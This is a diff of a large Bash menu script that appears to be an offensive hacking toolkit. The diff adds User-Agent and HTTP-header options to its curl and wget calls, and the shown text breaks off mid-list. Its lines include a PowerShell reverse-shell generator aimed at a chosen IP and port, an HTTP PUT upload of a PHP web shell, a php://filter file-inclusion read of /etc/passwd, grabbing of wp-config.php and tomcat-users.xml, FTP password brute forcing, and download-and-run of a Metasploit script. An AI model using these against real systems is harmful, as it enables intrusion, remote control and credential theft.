@@ -3,8 +3,6 @@
 #Author: Fabio Defilippo
 #email: 4starfds@gmail.com
 
-PYPAK="0trace 3proxy 3proxy-win32 42zip ace admid-pack afflib afpfs-ng against aiengine aimage air airgraph-ng american-fuzzy-lop androguard android-apktool android-ndk android-sdk-platform-tools android-sdk android-udev-rules arachni arduino argus argus-clients armitage arp-scan artillery asp-audit athena-ssl-scanner auto-xor-decryptor autopsy azazel b2sum backdoor-factory balbuzard bamf-framework batman-adv bbqsql bbrecon bed beef beholder bgp-md5crack bing-ip2hosts bing-lfi-rfi binwalk bios_memimage blackarch-menus bletchley bluebox-ng bluelog blueprint bmap-tools bob-the-butcher braa braces browser-fuzzer brutus bsdiff bss bt_audit bulk-extractor bully bunny burpsuite bvi cadaver canari capstone casefile centry cewl cflow check-weak-dh-ssh checkpwd checksec chiron chownat chrome-decode cidr2range ciphertest cirt-fuzzer cisco-auditing-tool cisco-global-exploiter cisco-ocs cisco-router-config cisco-scanner cisco-torch cisco5crack cisco7crack ciscos climber cloudsplaining clusterd cms-explorer cms-few codetective complemento conpot cookie-cadger cppcheck cpptest crackle create-ap creds creepy crunch cuckoo cupp cutycapt darkd0rk3r dbd dc3dd ddrescue device-pharmer dex2jar dff-scanner dhcpig dirb dirbuster dirs3arch dislocker dissector dizzy dmitry dns-spoof dns2geoip dns2tcp dnsa dnschef dnsmap dnsrecon dnsutils domain-analyzer dradis dripper dsd dsniff dumb0 dump1090 eapmd5pass easy-creds eazy edb eindeutig elettra elettra-gui elite-proxy-finder enabler ent enum-shares enum4linux erase-registrations ettercap exiv2 exploit-db eyewitness facebot fakeap fakedns fakemail fang fern-wifi-cracker fierce fiked filibuster fimap findmyhash firmware-mod-kit fl0p flare flasm flawfinder flunym0us foremost fping fport fraud-bridge freeipmi freeradius fs-nyarl ftp-fuzz ftp-scanner ftp-spider fusil fuzzdb g72x++ galleta gdb geoip ghost-phisher ghost-py gnuradio gnutls2 goldeneye golismero goog-mail gqrx grabber gtalk-decode gtp-scan hackersh halberd halcyon hamster handle hasere hash-identifier hashcat hashcat-utils hasher hashid hashpump hashtag haystack hdcp-genkey hdmi-sniff heartbleed-honeypot hex2bin honeyd honssh host-extract hostbox-ssh hotpatch hotspotter hpfeeds hping http-enum http-fuzz http-put http-traceroute httpforge httping httprint-win32 hulk hwk hydra hyenae hyperion ike-scan imagejs inception intercepter-ng interrogate intersect inundator iodine ip-https-tools iputils ipv6toolkit isr-form jad jboss-autopwn jd-gui jhead jigsaw john johnny joomscan js-beautify jsql junkie jynx2 kalibrate-rtl kippo kismet kismet-earth kismet2earth klogger kolkata kraken laf lans latd lbd leo leroy-jenkins lfi-autopwn lfi-exploiter lfi-fuzzploit lfi-scanner lfi-sploiter lft liffy linenum linux-exploit-suggester list-urls logkeys loki lynis mac-robber macchanger maclookup magictree make-pdf malheur maligno maltego maltrieve malware-check-tool marc4dasm maskprocessor masscan mat md5deep mdbtools mdk3 mdns-scan medusa melkor memdump metasploit miranda-upnp missionplanner mitmproxy mkbrutus moloch monocle mp3nema mptcp mptcp-abuse ms-sys mtr mutator mysql2sqlite nbtool ncrack nemesis netbios-share-scanner netcon netdiscover netmap netmask netscan netsniff-ng netzob ngrep nield nikto nipper nmap nsec3walker ntds-decode o-saft oat obfsproxy objection oclhashcat ocs ollydbg onesixtyone onionsearch onionshare openvas-cli openvas-libraries openvas-manager openvas-scanner origami ostinato owasp-bywaf owtf p0f pack packet-o-matic packeth packit padbuster panoptic paros parsero pasco passe-partout passivedns patator pathod pcredz pdf-parser pdfbook-analyzer pdfid pdfresurrect peach peda peepdf perl-image-exiftool perl-tftp pev php-mt-seed php-rfi-payload-decoder php-vulnerability-hunter plecost pompem posttester powersploit prometheus protos-sip proxychains-ng proxycheck proxyp proxytunnel pscan pshitt pwd-hash pwn pwntools py2exe pyew pyinstaller pyrasite pyrit python-utidylib python2-binaryornot python2-yara radamsa radare2 radiography rarcrack rawr rcracki-mt rdesktop-brute reaver rebind recon-ng regeorg relay-scanner responder rfcat rfidiot rkhunter rlogin-scanner ropgadget ropper rrs rtlsdr-scanner rtp-flood ruby-msgpack ruby-ronin ruby-ronin-support ruby-uri-query_params rww-attack safecopy sakis3g sandy sasm sb0x sbd scalpel scanmem scapy schnappi-dhcp scout2 scrapy scrounge-ntfs seat secure-delete sees sergio-proxy sessionlist set shellme siege silk simple-ducky simple-lan-scan sinfp sipp sipvicious skipfish skype-dump sleuthkit slowloris smali smartphone-pentest-framework smbexec smtp-fuzz smtp-user-enum smtp-vrfy sn00p snmp-fuzzer snoopy-ng snort snow socat soot spade spectools spiderfoot spiderpig-pdffuzzer spike spike-proxy splint sploitego sps sqid sqlmap sqlninja ssh-privkey-crack sshuttle ssl-hostname-resolver ssl-phuck3r ssldump sslh sslscan sslstrip sslyze starttls-mitm steghide stompy storm-ring stunnel subdomainer sulley suricata svn-extractor swaks synflood synscan sysdig sysinternals-suite t50 tbear tcpcontrol-fuzzer tcpdump tcpextract tcpflow tcpreplay tcpwatch teardown tekdefense-automater termineter tftp-bruteforce tftp-fuzz tftp-proxy thc-ipv6 thc-keyfinder thc-pptp-bruter thc-smartbrute thc-ssl-dos theharvester tiger tilt tinc tinyproxy tlsenum tor tor-autocircuit tor-browser-en torshammer torsocks traceroute trid trinity trixd00r truecrypt tsh tsh-sctp twofi u3-pwn ubertooth udis86 uefi-firmware-parser ufo-wardriving umap umit unhide unicorn unicornscan unix-privesc-check unsecure upx username-anarchy usernamer uw-loveimap uw-offish uw-udpscan uw-zone v3n0m valgrind vanguard vega veil viper vivisect vnc-bypauth volatility w3af wapiti web-soul webhandler webpwn3r webshells websockify webspa websploit weevely wfuzz whatweb wi-feye wifi-honey wifi-monitor wifiphisher wig wikigen winexe winfo wireless-ids wireshark-cli wireshark-gtk wlan2eth wmat wol-e wpscan ws-attacker x-scan xcavator xf86-video-qxl-git xortool xsser xsss yara ycrawler yersinia zaproxy zmap zulu zzuf"
-RUPAK="activemodel activerecord activesupport addressable ansi apscanner apullo arp_scan  async async-dns async-http async-io async-pool atomic benchmark bigdecimal brakeman bscan buftok bundler celluloid celluloid-io cgi cms_scanner colorize concurrent-ruby concurrent-ruby-edge console csv daemons date dawnscanner dbm delegate did_you_mean dockscan domain_name domains_scanner DrupalScan em-websocket equalizer erubis espeak-ruby etc ethon eventmachine execjs fast_port_scanner fcntl ffi ffi-compiler fiber-local fiddle fileutils forwardable gdbm get_process_mem getoptlong google-cloud-web_security_scanner hacker-gems ham hashie hashie-forbidden_attributes hitimes http http-accept http-cookie http-form_data http-parser http_parser.rb httpclient http_scanner i18n io-console ipaddr ipaddress irb json logger matrix maxmind-db mdless memoizable mime mime-types mime-types-data mini_exiftool minitest mojo_magick msfrpc-client msgpack multi_json multipart-post mustermann mutex_m naught net-http-digest_auth net-pop net-smtp net-telnet netrc network_scanner nio4r nokogiri observer oj open3 openssl opt_parse_validator ostruct otr-activerecord parseconfig password_crack pkg-config portfinder portscanner power_assert prime protocol-hpack protocol-http protocol-http1 protocol-http2 pstore psych public_suffix qr4r racc rack rack-protection rake rchardet rdoc readline readline-ext recog reline rest-client rexml rpc-mapper rqrcode_core rss ruby-progressbar ruby_wifi_scanner ruby2_keywords rubydns rubygems-update rubyzip rushover scanny ScanSSL sdbm simple_oauth sinatra singleton slack-notifier smb-client snmp snmpdumper snmpscan spider sqlite3 ssh-exec ssh_scan ssl_scan ssl_scanner stringio strscan sync term-ansicolor test-unit thin thread_safe tilt timeout timers tins tracer twitter typhoeus tzinfo uglifier unf unf_ext uri w3map webrick wordstress wpscan xmlrpc XSpear xss yajl-ruby yaml zeitwerk zlib zola"
 ENTSSL="https://github.com/"
 ENTRAW="https://raw.githubusercontent.com/"
 ENTLAB="https://gitlab.com/"
@@ -21,6 +19,9 @@ FMSG="press ENTER to continue..."
 CURLANON=""
 DEFANON=""
 ANON="Disabled"
+HEADERS=("")
+SHEADER=""
+USERAGENT=""
 SECL="$ENTRAW""danielmiessler/SecLists/master/"
 DISC="Discovery/Web-Content/"
 GHWPL=("CMS/wordpress.fuzz.txt" "CMS/wp-plugins.fuzz.txt" "CMS/wp-themes.fuzz.txt" "URLs/urls-wordpress-3.3.1.txt")
@@ -31,9 +32,9 @@ function Controlla
 {
 	if [[ "$ANON" == "Enabled" ]];
 	then
-		curl -s -k -L -I $CURLANON "$1"
+		curl $SHEADER $USERAGENT -s -k -L -I $CURLANON "$1"
 	else
-		wget --no-check-certificate --spider "$1"
+		wget $SHEADER $USERAGENT --no-check-certificate --spider "$1"
 	fi
 }
 
@@ -41,17 +42,17 @@ function ScaricaIn
 {
 	if [[ -d "$ALD" ]];
 	then
-		wget --no-check-certificate "$1" -O "$ALD""$2"
+		wget $SHEADER $USERAGENT --no-check-certificate "$1" -O "$ALD""$2"
 	elif [[ -d "$AZD" ]];
 	then
-		wget --no-check-certificate "$1" -O "$AZD""$2"
+		wget $SHEADER $USERAGENT --no-check-certificate "$1" -O "$AZD""$2"
 	else
 		ls /storage
 		echo "Digit where download, remember the slash at the end of the path"
 		read -e -p "(example, /storage/emulated/legacy/Download/): " ATD
 		if [[ -d "$ATD" ]];
 		then
-			wget --no-check-certificate "$1" -O "$ATD""$2"
+			wget $SHEADER $USERAGENT --no-check-certificate "$1" -O "$ATD""$2"
 		fi
 	fi
 	echo "Downloaded ""$2"
@@ -145,7 +146,7 @@ function Clona
 	DKF="Dockerfile"
 	echo "Choose what version you want to download ""$1"
 	echo "0. back"
-	if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* || $(wget -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
+	if [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* || $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
 	then
 		echo "1. Dockerfile"
 	fi
@@ -156,7 +157,7 @@ function Clona
 		echo "2. Release"
 	fi
 	echo "3. Clone"
-	if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* || $(wget -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
+	if [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* || $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
 	then
 		echo "4. read the README.md file"
 	fi
@@ -169,11 +170,11 @@ function Clona
 		then
 			docker build -t $(echo -n "$1" | awk -F "/" '{print $2}') "$ENTSSL""$1"".git"
 		else
-			if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* ]];
+			if [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/""$DKF" 2>&1) == *"200 OK"* ]];
 			then
 				Scarica "$ENTRAW""$1""/master/""$DKF" "$DKF"
 			else
-				if [[ $(wget -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
+				if [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/""$DKF" 2>&1) == *"200 OK"* ]];
 				then
 					Scarica "$ENTRAW""$1""/main/""$DKF" "$DKF"
 				else
@@ -211,12 +212,12 @@ function Clona
 		else
 			LESS="less"
 		fi
-		if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* ]];
+		if [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* ]];
 		then
-			curl -s -k -L "$ENTRAW""$1""/master/README.md" | $LESS
-		elif [[ $(wget -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
+			curl $SHEADER $USERAGENT -s -k -L "$ENTRAW""$1""/master/README.md" | $LESS
+		elif [[ $(wget $SHEADER $USERAGENT -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
 		then
-			curl -s -k -L "$ENTRAW""$1""/main/README.md" | $LESS
+			curl $SHEADER $USERAGENT -s -k -L "$ENTRAW""$1""/main/README.md" | $LESS
 		else
 			echo "There is not any README.md file"
 		fi
@@ -230,9 +231,9 @@ function ScaricaWL
 {
 	if [[ "$ANON" == "Enabled" ]];
 	then
-		curl -s -k -L $CURLANON "$1"
+		curl $SHEADER $USERAGENT -s -k -L $CURLANON "$1"
 	else
-		wget --no-check-certificate "$1" -O -
+		wget $SHEADER $USERAGENT --no-check-certificate "$1" -O -
 	fi
 }
 
@@ -242,19 +243,19 @@ function Scarica
 	then
 		if [[ "$2" != "" ]];
 		then
-			curl -s -k -L $CURLANON "$1" -o "$2"
+			curl $SHEADER $USERAGENT -s -k -L $CURLANON "$1" -o "$2"
 		else
 			QUESTO="./"$(echo "$1" | awk -F "/" '{print $NF}')
-			curl -s -k -L $CURLANON "$1" -o "$QUESTO"
+			curl $SHEADER $USERAGENT -s -k -L $CURLANON "$1" -o "$QUESTO"
 			chmod +x "$QUESTO"
 		fi
 	else
 		if [[ "$2" != "" ]];
 		then
-			wget --no-check-certificate "$1" -O "$2"
+			wget $SHEADER $USERAGENT --no-check-certificate "$1" -O "$2"
 			chmod +x "./""$2"
 		else
-			wget --no-check-certificate "$1"
+			wget $SHEADER $USERAGENT --no-check-certificate "$1"
 			chmod +x "./"$(echo "$1" | awk -F "/" '{print $NF}')
 		fi
 	fi
@@ -2075,7 +2076,8 @@ while true; do
 		Stampa " 2648. XOR bitwise a string value" "2649. XOR bitwise an array of chars converted in INT values"
 		Stampa " 2650. AND bitwise an array of chars converted in INT values"
 		Stampa " 2651. OR bitwise an array of chars converted in INT values"
-		Stampa " 2652. AND bitwise string value" "2653. OR bitwise string value"
+		Stampa " 2652. AND bitwise string value" "2653. OR bitwise string value" "2654. set User-Agent"
+		Stampa " 2655. set HTTP request headers"
 		echo "$SEP"
 	fi
 	echo "$CGT"" GT. VIRTUAL COINS - CURRENCIES"
@@ -2444,7 +2446,7 @@ while true; do
 		then
 			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""windows/remote/"
 			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows/remote"
-			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows/remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
+			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
 			do
 				if [[ "$EXP" != "" ]];
 				then
@@ -2469,7 +2471,7 @@ while true; do
 		then
 			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""windows_x86/remote/"
 			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86/remote"
-			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86/remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
+			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
 			do
 				if [[ "$EXP" != "" ]];
 				then
@@ -2494,7 +2496,7 @@ while true; do
 		then
 			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""windows_x86-64/remote/"
 			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86-64/remote"
-			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86-64/remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
+			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""windows_x86-64/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
 			do
 				if [[ "$EXP" != "" ]];
 				then
@@ -2519,7 +2521,7 @@ while true; do
 			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""remote/"
 			ENTTO="$ENTRAW""$OFFSEC""$MEX""remote/"
 			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/master/remote"
-			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
+			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
 			do
 				if [[ "$EXP" != "" ]];
 				then
@@ -2544,7 +2546,7 @@ while true; do
 		then
 			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""android/remote/"
 			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""android/remote"
-			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""android/remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
+			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""android/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
 			do
 				if [[ "$EXP" != "" ]];
 				then
@@ -2569,7 +2571,7 @@ while true; do
 		then
 			ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""ios/remote/"
 			echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""ios/remote"
-			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""ios/remote" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
+			select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""ios/remote" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
 			do
 				if [[ "$EXP" != "" ]];
 				then
@@ -2597,7 +2599,7 @@ while true; do
 				ENTFRM="$ENTSSL""$OFFSEC""blob/""$MEX""$TIPO""/"
 				ENTTO="$ENTRAW""$OFFSEC""$MEX""$TIPO""/"
 				echo "Select a file name from ""$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO"
-				select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" |  grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
+				select EXP in $(lynx -dump -listonly "$ENTSSL""$OFFSEC""tree/""$MEX""$TIPO" | grep "$ENTFRM" | awk '{print $2}' | while read -r EXP; do echo "${EXP/$ENTFRM/}"; done)
 				do
 					if [[ "$EXP" != "" ]];
 					then
@@ -2702,7 +2704,7 @@ while true; do
 	;;
 	"44")
 		Clona "lc/gau"
-		wget --no-check-certificate "$ENTRAW""kleiton0x00/CORS-one-liner/master/README.md" -O "CORS-one-liner-README.txt"
+		wget $SHEADER $USERAGENT --no-check-certificate "$ENTRAW""kleiton0x00/CORS-one-liner/master/README.md" -O "CORS-one-liner-README.txt"
 	;;
 	"45")
 		Clona "porterhau5/BloodHound-Owned"
@@ -3417,7 +3419,7 @@ while true; do
 				read -p "(example, fetch 1:* (UID FLAGS INTERNALDATE ENVELOPE)): " IMAPREQ
 				if [[ "$IMAPREQ" != "" ]];
 				then
-					curl $CURLANON --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
+					curl $SHEADER $USERAGENT $CURLANON --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
 				fi
 			fi
 		fi
@@ -3569,7 +3571,7 @@ while true; do
 		then
 			if [[ "$MPORT" =~ ^[0-9]+$ ]];
 			then
-				echo "\$client = New-Object System.Net.Sockets.TCPClient(\"""$MIP""\",""$MPORT"");\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+				echo "\$client = New-Object System.Net.Sockets.TCPClient(\"""$MIP""\",""$MPORT"");\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
 			fi
 		fi
 	;;
@@ -4925,7 +4927,7 @@ while true; do
 			read -p "(example, ../../etc/passwd or ./index.php): " PAGE
 			if [[ "$PAGE" != "" ]];
 			then
-				curl $CURLANON "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
+				curl $SHEADER $USERAGENT $CURLANON "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
 			fi
 		fi
 	;;
@@ -5061,7 +5063,7 @@ while true; do
 		read -p "(example, http://site.web or http://192.168.0.12): " URL
 		if [[ "$URL" != "" ]];
 		then
-			for FILE in "conf/tomcat-users.xml" "wp-includes/certificates/ca-bundle.crt" "robots.txt" ".htaccess" "condig.php" "sitemap.xml" "phpinfo.php" "wp-config.php"; do wget "$URL""/""$FILE"; done
+			for FILE in "conf/tomcat-users.xml" "wp-includes/certificates/ca-bundle.crt" "robots.txt" ".htaccess" "condig.php" "sitemap.xml" "phpinfo.php" "wp-config.php"; do wget $SHEADER $USERAGENT "$URL""/""$FILE"; done
 		fi
 	;;
 	"599")
@@ -5076,7 +5078,7 @@ while true; do
 			read -e -p "(example, wsh3ll): " SHL
 			if [[ "$SHL" != "" ]];
 			then
-				curl $CURLANON -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$URL""/""$SHL"".php"
+				curl $SHEADER $USERAGENT $CURLANON -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$URL""/""$SHL"".php"
 			fi
 		fi
 	;;
@@ -5124,7 +5126,7 @@ while true; do
 		Scarica "$ENTRAW""dariusztytko/jwt-key-id-injector/master/injector.py"
 	;;
 	"615")
-		pkg update && pkg upgrade -y && pkg install curl wget tsu wget git && wget --no-check-certificate "$ENTRAW""Hax4us/Metasploit_termux/master/metasploit.sh" -O metasploit.sh && bash metasploit.sh
+		pkg update && pkg upgrade -y && pkg install curl wget tsu wget git && wget $SHEADER $USERAGENT --no-check-certificate "$ENTRAW""Hax4us/Metasploit_termux/master/metasploit.sh" -O metasploit.sh && bash metasploit.sh
 	;;
 	"616")
 		Clona "rajkumardusad/Tool-X"
@@ -5184,7 +5186,7 @@ while true; do
 	;;
 	"628")
 		echo "Digit target IP or URL"
-		read -p "(example  192.168.168.12 or http://something.dark): " TIP
+		read -p "(example 192.168.168.12 or http://something.dark): " TIP
 		if [[ "$TIP" != "" ]];
 		then
 			echo "Digit target username"
@@ -5345,7 +5347,7 @@ while true; do
 					TDP="$TTDP"
 				fi
 			fi
-			curl $CURLANON -s "$TIP"":""$TDP""/version" | python -m json.tool
+			curl $SHEADER $USERAGENT $CURLANON -s "$TIP"":""$TDP""/version" | python -m json.tool
 		fi
 	;;
 	"653")
@@ -5694,7 +5696,7 @@ while true; do
 		read -p "(example, 10.11.12.13): " IP
 		if [[ "$IP" != "" ]];
 		then
-			wget -m --no-passive ftp://anonymous:anonymous@$IP
+			wget $SHEADER $USERAGENT -m --no-passive ftp://anonymous:anonymous@$IP
 		fi
 	;;
 	"750")
@@ -5714,7 +5716,7 @@ while true; do
 					do
 						for USRN in $(cat "$UWRD");
 						do
-							wget -m --no-passive "ftp://$USRN:$PSSW@$IP"
+							wget $SHEADER $USERAGENT -m --no-passive "ftp://$USRN:$PSSW@$IP"
 						done
 					done
 				fi
@@ -10349,7 +10351,7 @@ while true; do
 		Clona "presidentbeef/brakeman"
 	;;
 	"2267")
-		select PIPO in $PYPAK
+		select PIPO in "0trace" "3proxy" "3proxy-win32" "42zip" "ace" "admid-pack" "afflib" "afpfs-ng" "against" "aiengine" "aimage" "air" "airgraph-ng" "american-fuzzy-lop" "androguard" "android-apktool" "android-ndk" "android-sdk-platform-tools" "android-sdk" "android-udev-rules" "arachni" "arduino" "argus" "argus-clients" "armitage" "arp-scan" "artillery" "asp-audit" "athena-ssl-scanner" "auto-xor-decryptor" "autopsy" "azazel" "b2sum" "backdoor-factory" "balbuzard" "bamf-framework" "batman-adv" "bbqsql" "bbrecon" "bed" "beef" "beholder" "bgp-md5crack" "bing-ip2hosts" "bing-lfi-rfi" "binwalk" "bios_memimage" "blackarch-menus" "bletchley" "bluebox-ng" "bluelog" "blueprint" "bmap-tools" "bob-the-butcher" "braa" "braces" "browser-fuzzer" "brutus" "bsdiff" "bss" "bt_audit" "bulk-extractor" "bully" "bunny" "burpsuite" "bvi" "cadaver" "canari" "capstone" "casefile" "centry" "cewl" "cflow" "check-weak-dh-ssh" "checkpwd" "checksec" "chiron" "chownat" "chrome-decode" "cidr2range" "ciphertest" "cirt-fuzzer" "cisco-auditing-tool" "cisco-global-exploiter" "cisco-ocs" "cisco-router-config" "cisco-scanner" "cisco-torch" "cisco5crack" "cisco7crack" "ciscos" "climber" "cloudsplaining" "clusterd" "cms-explorer" "cms-few" "codetective" "complemento" "conpot" "cookie-cadger" "cppcheck" "cpptest" "crackle" "create-ap" "creds" "creepy" "crunch" "cuckoo" "cupp" "cutycapt" "darkd0rk3r" "dbd" "dc3dd" "ddrescue" "device-pharmer" "dex2jar" "dff-scanner" "dhcpig" "dirb" "dirbuster" "dirs3arch" "dislocker" "dissector" "dizzy" "dmitry" "dns-spoof" "dns2geoip" "dns2tcp" "dnsa" "dnschef" "dnsmap" "dnsrecon" "dnsutils" "domain-analyzer" "dradis" "dripper" "dsd" "dsniff" "dumb0" "dump1090" "eapmd5pass" "easy-creds" "eazy" "edb" "eindeutig" "elettra" "elettra-gui" "elite-proxy-finder" "enabler" "ent" "enum-shares" "enum4linux" "erase-registrations" "ettercap" "exiv2" "exploit-db" "eyewitness" "facebot" "fakeap" "fakedns" "fakemail" "fang" "fern-wifi-cracker" "fierce" "fiked" "filibuster" "fimap" "findmyhash" "firmware-mod-kit" "fl0p" "flare" "flasm" "flawfinder" "flunym0us" "foremost" "fping" "fport" "fraud-bridge" "freeipmi" "freeradius" "fs-nyarl" "ftp-fuzz" "ftp-scanner" "ftp-spider" "fusil" "fuzzdb" "g72x++" "galleta" "gdb" "geoip" "ghost-phisher" "ghost-py" "gnuradio" "gnutls2" "goldeneye" "golismero" "goog-mail" "gqrx" "grabber" "gtalk-decode" "gtp-scan" "hackersh" "halberd" "halcyon" "hamster" "handle" "hasere" "hash-identifier" "hashcat" "hashcat-utils" "hasher" "hashid" "hashpump" "hashtag" "haystack" "hdcp-genkey" "hdmi-sniff" "heartbleed-honeypot" "hex2bin" "honeyd" "honssh" "host-extract" "hostbox-ssh" "hotpatch" "hotspotter" "hpfeeds" "hping" "http-enum" "http-fuzz" "http-put" "http-traceroute" "httpforge" "httping" "httprint-win32" "hulk" "hwk" "hydra" "hyenae" "hyperion" "ike-scan" "imagejs" "inception" "intercepter-ng" "interrogate" "intersect" "inundator" "iodine" "ip-https-tools" "iputils" "ipv6toolkit" "isr-form" "jad" "jboss-autopwn" "jd-gui" "jhead" "jigsaw" "john" "johnny" "joomscan" "js-beautify" "jsql" "junkie" "jynx2" "kalibrate-rtl" "kippo" "kismet" "kismet-earth" "kismet2earth" "klogger" "kolkata" "kraken" "laf" "lans" "latd" "lbd" "leo" "leroy-jenkins" "lfi-autopwn" "lfi-exploiter" "lfi-fuzzploit" "lfi-scanner" "lfi-sploiter" "lft" "liffy" "linenum" "linux-exploit-suggester" "list-urls" "logkeys" "loki" "lynis" "mac-robber" "macchanger" "maclookup" "magictree" "make-pdf" "malheur" "maligno" "maltego" "maltrieve" "malware-check-tool" "marc4dasm" "maskprocessor" "masscan" "mat" "md5deep" "mdbtools" "mdk3" "mdns-scan" "medusa" "melkor" "memdump" "metasploit" "miranda-upnp" "missionplanner" "mitmproxy" "mkbrutus" "moloch" "monocle" "mp3nema" "mptcp" "mptcp-abuse" "ms-sys" "mtr" "mutator" "mysql2sqlite" "nbtool" "ncrack" "nemesis" "netbios-share-scanner" "netcon" "netdiscover" "netmap" "netmask" "netscan" "netsniff-ng" "netzob" "ngrep" "nield" "nikto" "nipper" "nmap" "nsec3walker" "ntds-decode" "o-saft" "oat" "obfsproxy" "objection" "oclhashcat" "ocs" "ollydbg" "onesixtyone" "onionsearch" "onionshare" "openvas-cli" "openvas-libraries" "openvas-manager" "openvas-scanner" "origami" "ostinato" "owasp-bywaf" "owtf" "p0f" "pack" "packet-o-matic" "packeth" "packit" "padbuster" "panoptic" "paros" "parsero" "pasco" "passe-partout" "passivedns" "patator" "pathod" "pcredz" "pdf-parser" "pdfbook-analyzer" "pdfid" "pdfresurrect" 